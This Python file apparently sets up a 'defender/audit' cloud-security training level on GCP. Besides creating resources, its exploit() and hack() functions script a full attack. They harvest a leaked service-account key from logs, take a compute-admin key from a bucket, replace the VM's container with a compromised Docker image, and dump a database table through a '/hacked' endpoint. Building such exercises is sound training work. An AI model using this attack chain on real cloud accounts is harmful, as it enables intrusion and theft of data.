import random
import os
import subprocess
import time
import json
import csv
import sqlalchemy
import string
import google.auth
import requests
import shutil

from googleapiclient import discovery
from sqlalchemy.sql import text
from google.oauth2 import service_account, id_token
from core.framework import levels
from google.cloud import (
    storage,
    secretmanager,
    logging as glogging
)
from core.framework.cloudhelpers import (
    deployments,
    iam,
    gcstorage,
    cloudfunctions
)
import google.auth.transport.requests
from google.auth.transport.requests import AuthorizedSession

LEVEL_PATH = 'defender/audit'
FUNCTION_LOCATION = 'us-central1'
DB_SECRET_ID = 'defender_db_password'

def create(second_deploy=True):
    print("Level initialization started for: " + LEVEL_PATH)
    nonce = str(random.randint(100000000000, 999999999999))
    credentials, project_id = google.auth.default()

    #the cloud function may need to know information about the vm in order to hit our API. put that info here.
    func_template_args = {}

    func_upload_url = cloudfunctions.upload_cloud_function(
            f'core/levels/{LEVEL_PATH}/resources/rmUser', FUNCTION_LOCATION, template_args=func_template_args)

    # Create database password value
    db_secret_value = ''
    for _ in range(0,64): 
        db_secret_value += random.choice(string.ascii_letters + string.digits)
    create_secret(DB_SECRET_ID, db_secret_value)

    config_template_args = {
        'nonce': nonce,
        'root_password': db_secret_value,
        'func_upload_url': func_upload_url
        }

    template_files = [
        'core/framework/templates/service_account.jinja',
        'core/framework/templates/iam_policy.jinja',
        'core/framework/templates/sql_db.jinja',
        'core/framework/templates/container_vm.jinja',
        'core/framework/templates/bucket_acl.jinja',
        'core/framework/templates/cloud_function.jinja'
        ]

    if second_deploy:
        deployments.insert(
            LEVEL_PATH,
            template_files=template_files,
            config_template_args=config_template_args,
            second_deploy=True
        )
    else:
        deployments.insert(
            LEVEL_PATH,
            template_files=template_files,
            config_template_args=config_template_args
        )

    print("Level setup started for: " + LEVEL_PATH)
    create_tables(db_secret_value)
    dev_key = iam.generate_service_account_key('dev-account')
    dev_sa = service_account.Credentials.from_service_account_info(json.loads(dev_key))
    compute_admin_key = iam.generate_service_account_key('compute-admin')
    logging_key = iam.generate_service_account_key('log-viewer')
    # add vm files to bucket
    storage_client = storage.Client()
    vm_image_bucket = storage_client.get_bucket(f'vm-image-bucket-{nonce}')
    gcstorage.upload_directory_recursive(f'core/levels/{LEVEL_PATH}/resources/api-engine', f'vm-image-bucket-{nonce}')

    storage_blob = storage.Blob('compute-admin.json', vm_image_bucket)
    storage_blob.upload_from_string(compute_admin_key)
    
    #os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = 'start/dev-account.json'
    url = "http://us-central1-" + project_id + ".cloudfunctions.net/rm-user-" + nonce

    req = google.auth.transport.requests.Request()
    id_token = google.oauth2.id_token.fetch_id_token(req, url)
    headers = {'Authorization': f"Bearer {id_token}"}
    data = {'name':'Robert Caldwell', 'authentication':dev_key}
    resp = req(url, method = 'POST', body = data, headers = headers)

    time.sleep(5)
    hostname = exploit(nonce, logging_key)
    time.sleep(5)
    hack(hostname)

    print(f'Level creation complete for: {LEVEL_PATH}')
    start_message = ('Helpful start message')
    levels.write_start_info(LEVEL_PATH, start_message, file_name="dev-account.json", file_content=dev_key)


def create_secret(secret_id, secret_value):
    _, project_id = google.auth.default()

    # Create Secrets Manager client
    sm_client = secretmanager.SecretManagerServiceClient()

    # Create secret
    secret = sm_client.create_secret(
        request={
            "parent": f'projects/{project_id}',
            "secret_id": secret_id,
            "secret": {
                "name": secret_value,
                "replication": {"automatic": {}}
            }
        }
    )

    # Add the secret version.
    version = sm_client.add_secret_version(
        request={"parent": secret.name, "payload": {"data": secret_value.encode()}}
    )


def create_tables(db_password):
    credentials, project_id = google.auth.default()
    service = discovery.build('sqladmin', 'v1beta4', credentials=credentials)
    response = service.instances().list(project=project_id).execute()
    connection_name = response['items'][0]['connectionName']
    instance_name = response['items'][0]['name']
    user = {'kind':'sql#user','name':'api-engine','project':project_id,'instance':instance_name,'password':db_password}
    service.users().insert(project=project_id, instance=instance_name, body=user).execute()

    proxy = subprocess.Popen([f'core/levels/{LEVEL_PATH}/cloud_sql_proxy', f'-instances={connection_name}=tcp:5432'])
    try:
        time.sleep(5)

        db_config = {
            "pool_size": 5,
            "max_overflow": 2,
            "pool_recycle": 1800,  # 30 minutes
        }

        db = sqlalchemy.create_engine(
            sqlalchemy.engine.url.URL(
                drivername="postgresql+pg8000",
                username="api-engine",
                password=db_password,
                database="userdata-db",
                host='127.0.0.1',
                port=5432
            ),
            **db_config
        )
        db.dialect.description_encoding = None

        devs = csv.DictReader(open(f'core/levels/{LEVEL_PATH}/resources/devs.csv', newline=''))
        with db.connect() as conn:
            conn.execute(
                """
                CREATE TABLE users (
                    user_id  SERIAL PRIMARY KEY,
                    name     TEXT              NOT NULL,
                    phone    TEXT              NOT NULL,
                    address  TEXT              NOT NULL
                );
                CREATE TABLE devs (
                    dev_id   SERIAL PRIMARY KEY,
                    name     TEXT              NOT NULL,
                    phone    TEXT              NOT NULL,
                    address  TEXT              NOT NULL
                );
                CREATE TABLE follows (
                    follow_id SERIAL PRIMARY KEY,
                    follower INT   NOT NULL REFERENCES users(user_id),
                    followee INT   NOT NULL REFERENCES users(user_id)
                );
                """
            )

            for dev in devs:
                stmt = text("INSERT INTO devs (name, phone, address) VALUES (:name, :phone, :address)")
                conn.execute(stmt, dev)
        db.dispose()
    except Exception as e:
        proxy.terminate()
        raise e
    proxy.terminate()


def exploit(nonce, logging_key):
    credentials, project_id = google.auth.default()
    logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
    logger = logging_client.logger('rmUser')
    logs = logger.list_entries()
    # TODO fix sleep could crash if log is delayed
    dev_key = list(logs)[-1].payload['auth']
    print(dev_key)
    storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
    blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
    temp_dir = 'test/' ###TODO change me
    os.mkdir(temp_dir)
    for blob in blobs:
        blob.download_to_filename(f'{temp_dir}{blob.name}')

    with open(f'{temp_dir}compute-admin.json') as keyfile:    
        compute_admin_key = json.loads(keyfile.read())
    
    compute_api = discovery.build('compute', 'v1', credentials=service_account.Credentials.from_service_account_info(compute_admin_key))
    api_instance = compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    new_gce = '''
    metadata:
      name: a6
    spec:
      containers:
      - image: docker.io/aujxn/defender-audit-compromised:latest
        imagePullPolicy: Always
        name: a6
        ports:
        - containerPort: 80
          hostPort: 80
        volumeMounts: []
      volumes: []

  '''
    fingerprint = api_instance['metadata']['fingerprint']
    payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
    compute_api.instances().setMetadata(project=project_id, zone='us-west1-b', instance='api-engine', body=payload).execute()
    compute_api.instances().stop(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
        time.sleep(2)
    compute_api.instances().start(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
        time.sleep(2)
    shutil.rmtree(temp_dir)

    #returns External IP of the restarted vm
    #time.sleep(60)
    return compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['networkInterfaces'][0]['accessConfigs'][0]['natIP']


def hack(hostname):
    url = f'http://{hostname}/hacked'

    payload = {'sql': 'select * from devs;'}
    response = requests.post(url, data=payload)
    while(response.status_code != 200):
        time.sleep(10)
        response = requests.post(url, data=payload)
    print(response.text)

def delete_secret(secret_id):
    _, project_id = google.auth.default()

    # Create Secrets Manager client
    sm_client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret.
    name = sm_client.secret_path(project_id, secret_id)

    # Delete secret.
    sm_client.delete_secret(request={"name": name})


def destroy():
    levels.delete_start_files()
    deployments.delete()
    delete_secret(DB_SECRET_ID)